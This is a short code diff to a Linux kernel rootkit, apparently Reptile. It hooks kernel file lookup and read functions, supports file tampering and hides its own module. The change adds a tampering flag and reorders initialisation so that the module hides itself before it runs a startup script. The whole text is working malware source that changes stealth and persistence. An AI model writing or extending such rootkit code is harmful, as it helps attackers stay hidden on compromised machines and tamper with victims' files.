@@ -208,6 +208,7 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 #include "file.h"
 
 atomic_t read_on;
+int file_tampering_flag = 0;
 
 // This is not the best way to do that, but it works, maybe in the future I change that
 KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
@@ -447,11 +448,9 @@ static int __init reptile_init(void)
 {
 	int ret;
 
-	run_cmd(START_SCRIPT);
-
 #ifdef CONFIG_FILE_TAMPERING
 	/* Unfortunately I need to use this to ensure in some kernel
-	 * versions we will be able to unload the kernel module if
+	 * versions we will be able to unload the kernel module when
 	 * it is needed. Otherwise khook may take a really huge delay
 	 * to unload because of vfs_read hook
 	 */
@@ -464,6 +463,8 @@ static int __init reptile_init(void)
 #ifdef CONFIG_AUTO_HIDE
 	hide_module();
 #endif
+
+	run_cmd(START_SCRIPT);
 
 	return ret;
 }
